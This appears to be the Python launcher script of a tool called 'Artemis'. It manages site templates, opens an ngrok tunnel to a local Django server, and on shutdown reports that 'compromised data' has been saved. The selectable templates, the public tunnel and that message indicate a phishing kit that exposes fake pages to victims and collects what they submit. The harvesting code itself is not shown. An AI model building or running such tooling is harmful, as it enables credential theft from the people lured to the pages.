import os
import sys
import subprocess
import time
import re
import urllib.request

from artemis_server.artemis_core import utils


def start():
    """ check and retrieve arguments """
    args = sys.argv

    # check args
    if len(args) == 1:
        # main process is requested
        main()

    elif args[1] in ('-a', '--add'):
        if len(args) == 3:
            utils.add_template(args[2])
        else:
            utils.invalid_option_exit('No template directory specified')

    elif args[1] in ('-r', '--remove'):
        utils.remove_template(args)

    elif args[1] in ('-l', '--list'):
        utils.list_templates(args)

    elif args[1] in ('-d', '--deploy'):
        # manual staticfiles deployment
        print(utils.colorize('orange', 'Deploying staticfiles manually...'))

        # check if optional argument is present, for replacing
        # current staticfiles  (default is merging with  old one)
        if len(args) == 4 and args[3] == '--replace':
            replace = True
        else:
            replace = False

        utils.server_collectstatic(replace=replace)

    else:
        # case of invalid args or help menu request
        print(utils.help_text)


def main():
    """ run core function of artemis """
    print(utils.banner)

    # check and install needed packages
    utils.check_dependencies()

    print('Press Enter to start tunneling ngrok')
    input(utils.shell_head)

    utils.remove_prev_lines(2)

    # run core script
    run()


def run():
    try:
        # initialize tunnel
        print(utils.colorize('orange', 'Initializing Tunnel...'))

        # kill all ngrok processes if alive and start a new one
        subprocess.run(['killall', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            process = subprocess.Popen(['./ngrok', 'http', '8000'], stdout=subprocess.DEVNULL)
        except PermissionError:
            subprocess.call(['chmod', '700', 'ngrok'], stdout=subprocess.DEVNULL)
            process = subprocess.Popen(['./ngrok', 'http', '8000'], stdout=subprocess.DEVNULL)

        time.sleep(1)

        # connect localhost ngrok API and retrieve tunnel public URL
        ngrok_url = ''
        retry_counter = 0

        while not ngrok_url:
            # try to retrieve tunnel public URL
            if retry_counter == 5:
                print(utils.colorize('red', "Couldn't retrieve URL or create tunnel, terminating program..."))
                process.terminate()
                exit()

            try:
                api_data = urllib.request.urlopen('http://localhost:4040/api/tunnels').read().decode('utf-8')
            except urllib.error.URLError:
                print(utils.colorize('red', 'Failed to retrieve URL, trying again...'))
                retry_counter += 1
                time.sleep(2)
                continue

            # match URL in data
            ngrok_url = re.findall(
                r'https://[a-zA-Z0-9]+\.ngrok\.io', api_data
            )

            if ngrok_url:
                ngrok_url = ngrok_url[0]

                print(utils.colorize('green', 'Tunnel initialized successfully!'))
            else:
                retry_counter += 1
                print(utils.colorize('red', 'Failed to tunnel and retrieve URL, trying again...'))
                time.sleep(2)

        # add retrieved ngrok public URL in Django allowed hosts
        os.environ['ARTEMIS_URL'] = ngrok_url

        utils.choose_template()

        # start Artemis Django server
        print(utils.colorize('orange', 'Starting Artemis Server...'))
        subprocess.run(['python3', 'artemis_server/manage.py', 'runserver'])

    except KeyboardInterrupt:
        # if server is keyboard interrupted, terminate processes,
        # clear env variables and exit.
        process.terminate()

        utils.remove_env_var('ARTEMIS_URL')
        utils.remove_env_var('ARTEMIS_SITE')

        print(utils.colorize('blue', '\nArtemis has been stopped.'))
        print(utils.colorize('green', 'All compromised data are saved (if any).'))

        exit()


if __name__ == '__main__':
    try:
        start()
    except KeyboardInterrupt:
        print(utils.colorize('red', '\nArtemis stopped.'))
        exit()
